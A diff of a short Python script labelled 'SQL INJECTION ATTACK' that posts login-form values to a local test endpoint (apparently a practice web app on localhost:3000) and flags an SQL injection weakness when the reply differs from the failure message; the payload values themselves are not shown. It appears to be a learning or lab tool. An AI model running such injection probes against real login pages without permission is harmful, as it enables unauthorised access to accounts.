@@ -1,5 +1,4 @@
 import requests
-from bs4 import BeautifulSoup
 
 
 def input_values(email):
@@ -21,25 +20,21 @@ def input_values(email):
 
 
 def check_login(url, values):
-    """sends sqli to the login page and returns True if sqli vulnerabilities are found, False otherwise"""
-    weakness_count = []
-    for input_value in values:
-        response = requests.post(url, data=input_value)
-        web_warning_message = 'Invalid email or password.'
-        web_response = response.text
-        if web_response != (web_warning_message):
-            weakness_count.append(input_value)
-            return f"Security weakness: {len(weakness_count)}\n[*] {input_value}"
+    """sends sql injection to the login page and returns True if the weakness are found, False otherwise"""
+    for value in values:
+        res = requests.post(url, data=value).content
+        if res.decode() != 'Invalid email or password.':
+            return f"[WORNING] a SQL Injection weakness was found\nDetails:\n[*] {value}"
+    return f"No threats found."
 
 
 if __name__ == "__main__":
     try:
         print("\t-- SQL INJECTION ATTACK --\n")
         email = "admin@gmail.com"
-        url = "http://localhost:3000/#/login"
+        url = "http://localhost:3000/rest/user/login"
         values = input_values(email)
         print(check_login(url, values))
-
 
     except:
         print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")
